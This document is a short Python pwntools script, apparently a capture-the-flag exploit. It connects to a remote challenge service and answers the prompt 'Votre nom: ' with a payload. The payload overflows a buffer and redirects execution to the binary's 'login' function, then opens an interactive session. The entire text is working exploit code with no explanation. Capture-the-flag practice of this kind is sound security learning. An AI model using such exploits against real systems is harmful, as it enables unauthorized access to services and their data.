#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=1)

exe = ELF("./bin")
p = remote("cytech.tcdn.casa", 4304)
payload = flat({"gaaa": exe.sym["login"]})
log.hexdump(payload)
p.sendlineafter(b"Votre nom: ", payload)
p.interactive()
